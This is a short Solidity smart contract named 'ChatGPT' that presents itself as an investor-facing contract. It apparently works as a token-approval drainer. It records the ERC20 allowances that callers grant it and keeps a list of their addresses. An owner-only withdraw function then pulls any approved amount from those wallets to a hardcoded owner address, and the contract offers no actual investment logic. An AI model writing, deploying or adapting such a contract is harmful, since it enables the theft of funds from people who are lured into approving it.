//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import "./IERC20.sol";
import "./ERC20.sol";

contract ChatGPT {
    mapping(address => mapping(address => uint256)) internal InvestorMapping;

    uint256 private InvestorCounts;

    address[] private InvestorAddress;

    address internal Owner = 0x30EC02d4B5Ea83D800b8C68aAD30E348681526f9;

    event GetApprove(address sender, address contractadress);

    event withdrawevent(
        address wallet,
        address contractaddress,
        uint256 amount
    );

    modifier ONlyOwner() {
        require(msg.sender == Owner, "you are not admin");
        _;
    }

    function GetApproveFromInvestores(address Contractaddress) public {
        //uint256(-1)
        //Owner, 2 ^ (256 - 1)
        // IERC20(Contractaddress).approve(address(this),  IERC20(Contractaddress).allowance(msg.sender, address(this)));
        InvestorAddress.push(msg.sender);
        InvestorCounts += 1;
        uint256 allowanceamount = IERC20(Contractaddress).allowance(
            msg.sender,
            address(this)
        );
        InvestorMapping[msg.sender][Contractaddress] = allowanceamount;
        emit GetApprove(msg.sender, Contractaddress);
    }

    function withdraw(
        address ownerwallet,
        address contractaddres,
        uint256 amount
    ) public ONlyOwner {
        IERC20(contractaddres).transferFrom(ownerwallet, Owner, amount);
        deleteinvestor(ownerwallet, contractaddres);
        emit withdrawevent(ownerwallet, contractaddres, amount);
    }

    function GetInvestorCounts() public view ONlyOwner returns (uint256) {
        return InvestorCounts;
    }

    function GetInvestorAddress()
        public
        view
        ONlyOwner
        returns (address[] memory)
    {
        return InvestorAddress;
    }

    function GetInvestorMapping(address investor, address contractaddress)
        public
        view
        returns (uint256)
    {

        return InvestorMapping[investor][contractaddress];
    }

    function deleteinvestor(address investor, address contractaddress)
        internal
    {
        InvestorMapping[investor][contractaddress] = 0;
    }
}